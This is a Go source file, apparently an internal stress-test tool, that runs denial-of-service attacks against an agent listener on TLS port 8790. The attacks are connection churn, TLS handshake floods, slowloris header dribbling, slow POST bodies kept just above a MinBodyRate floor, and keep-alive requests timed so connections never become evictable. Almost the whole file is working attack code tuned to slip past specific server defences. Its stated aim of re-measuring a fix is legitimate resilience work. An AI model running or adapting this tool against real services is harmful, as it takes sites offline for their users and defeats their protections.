// MVP-11 independent re-measure: new attack shapes against the agent listener
// (TLS :8790) the fixer's flood.sh may not have covered, run from inside the
// sites network while a separate latency probe measures the protected site.
// Shapes: conn-churn (open+close TCP as fast as possible), tls-flood (complete
// TLS handshakes then drop), slowloris (open TLS, dribble request headers one
// byte at a time, never finish), slowbody (POST /v0/agent/report, send body
// just ABOVE MinBodyRate so it is not killed but ties up the body budget).
// stdlib only. Usage: newshapes <shape> <host:port> <workers> <seconds>
package main

import (
	"crypto/tls"
	"fmt"
	"net"
	"os"
	"strconv"
	"sync"
	"sync/atomic"
	"time"
)

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintln(os.Stderr, "usage: newshapes shape host:port workers seconds")
		os.Exit(2)
	}
	shape := os.Args[1]
	addr := os.Args[2]
	workers, _ := strconv.Atoi(os.Args[3])
	secs, _ := strconv.Atoi(os.Args[4])
	// Optional 5th arg: shape-specific knob. keep-young: gap in ms between
	// completed requests (must stay < evictMinAge 500 ms to keep the
	// connection too young to evict; default 300). slowbody-min: bytes per
	// second to trickle the body at (default 66560 = 65 KiB/s, just above the
	// 64 KiB/s MinBodyRate; default stays if omitted).
	knob := 0
	if len(os.Args) >= 6 {
		knob, _ = strconv.Atoi(os.Args[5])
	}
	deadline := time.Now().Add(time.Duration(secs) * time.Second)
	var ops, errs int64
	var wg sync.WaitGroup
	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	for w := 0; w < workers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for time.Now().Before(deadline) {
				switch shape {
				case "conn-churn":
					c, err := net.DialTimeout("tcp", addr, 3*time.Second)
					if err != nil {
						atomic.AddInt64(&errs, 1)
						continue
					}
					c.Close()
					atomic.AddInt64(&ops, 1)
				case "tls-flood":
					d := &net.Dialer{Timeout: 3 * time.Second}
					c, err := tls.DialWithDialer(d, "tcp", addr, tlsCfg)
					if err != nil {
						atomic.AddInt64(&errs, 1)
						continue
					}
					c.Close()
					atomic.AddInt64(&ops, 1)
				case "slowloris":
					d := &net.Dialer{Timeout: 3 * time.Second}
					c, err := tls.DialWithDialer(d, "tcp", addr, tlsCfg)
					if err != nil {
						atomic.AddInt64(&errs, 1)
						continue
					}
					// start a request, then dribble header bytes forever
					c.Write([]byte("POST /v0/agent/report HTTP/1.1\r\nHost: x\r\n"))
					hdr := "X-Pad: aaaaaaaaaaaaaaaaaaaa\r\n"
					ok := true
					for i := 0; i < 300 && time.Now().Before(deadline); i++ {
						if _, err := c.Write([]byte(hdr[i%len(hdr) : i%len(hdr)+1])); err != nil {
							ok = false
							break
						}
						time.Sleep(500 * time.Millisecond)
					}
					c.Close()
					if ok {
						atomic.AddInt64(&ops, 1)
					} else {
						atomic.AddInt64(&errs, 1)
					}
				case "slowbody":
					d := &net.Dialer{Timeout: 3 * time.Second}
					c, err := tls.DialWithDialer(d, "tcp", addr, tlsCfg)
					if err != nil {
						atomic.AddInt64(&errs, 1)
						continue
					}
					// Content-Length 600KiB, then trickle at ~80 KiB/s (above
					// the 64 KiB/s MinBodyRate) so the server keeps reading and
					// the 600KiB stays reserved in the body budget the whole time.
					body := 600 << 10
					fmt.Fprintf(c, "POST /v0/agent/report HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n", body)
					chunk := make([]byte, 8<<10)
					sent := 0
					for sent < body && time.Now().Before(deadline) {
						n, err := c.Write(chunk)
						if err != nil {
							break
						}
						sent += n
						time.Sleep(100 * time.Millisecond) // 8KiB/100ms = 80 KiB/s
					}
					c.Close()
					atomic.AddInt64(&ops, 1)
				case "keep-young":
					// Hold a connection slot that never ages past evictMinAge:
					// open a TLS keep-alive connection and send one complete,
					// cheap request after another with a gap < 500 ms. Each
					// completed request makes the connection busy (never
					// evictable) and, on going idle, resets its "since" to now
					// (connWaiting but too young to evict). A bank of these can
					// occupy every slot while none is ever evictable, so a new
					// agent connection finds no victim and is refused at accept.
					gap := time.Duration(knob) * time.Millisecond
					if gap <= 0 {
						gap = 300 * time.Millisecond
					}
					d := &net.Dialer{Timeout: 3 * time.Second}
					c, err := tls.DialWithDialer(d, "tcp", addr, tlsCfg)
					if err != nil {
						atomic.AddInt64(&errs, 1)
						continue
					}
					req := []byte("GET /healthz HTTP/1.1\r\nHost: x\r\nConnection: keep-alive\r\n\r\n")
					buf := make([]byte, 4<<10)
					okc := true
					for time.Now().Before(deadline) {
						if _, err := c.Write(req); err != nil {
							okc = false
							break
						}
						_ = c.SetReadDeadline(time.Now().Add(3 * time.Second))
						if _, err := c.Read(buf); err != nil {
							okc = false
							break
						}
						atomic.AddInt64(&ops, 1)
						time.Sleep(gap)
					}
					c.Close()
					if !okc {
						atomic.AddInt64(&errs, 1)
					}
				case "slowbody-min":
					// Headers complete at once (connection is busy, never
					// evictable), then the body trickles just ABOVE MinBodyRate.
					// Tests whether complete-header + minimum-rate bodies can
					// hold non-evictable slots and the shared body budget.
					rate := knob
					if rate <= 0 {
						rate = 66560 // 65 KiB/s, just above the 64 KiB/s floor
					}
					d := &net.Dialer{Timeout: 3 * time.Second}
					c, err := tls.DialWithDialer(d, "tcp", addr, tlsCfg)
					if err != nil {
						atomic.AddInt64(&errs, 1)
						continue
					}
					body := 600 << 10
					fmt.Fprintf(c, "POST /v0/agent/report HTTP/1.1\r\nHost: x\r\nContent-Type: application/json\r\nContent-Length: %d\r\n\r\n", body)
					step := rate / 10             // bytes per 100 ms
					chunk := make([]byte, step+1) // +1 keeps the rate strictly above the floor
					sent := 0
					for sent < body && time.Now().Before(deadline) {
						n, err := c.Write(chunk)
						if err != nil {
							break
						}
						sent += n
						time.Sleep(100 * time.Millisecond)
					}
					c.Close()
					atomic.AddInt64(&ops, 1)
				default:
					fmt.Fprintln(os.Stderr, "unknown shape", shape)
					os.Exit(2)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf(`{"shape":%q,"workers":%d,"seconds":%d,"ops":%d,"errs":%d}`+"\n", shape, workers, secs, ops, errs)
}
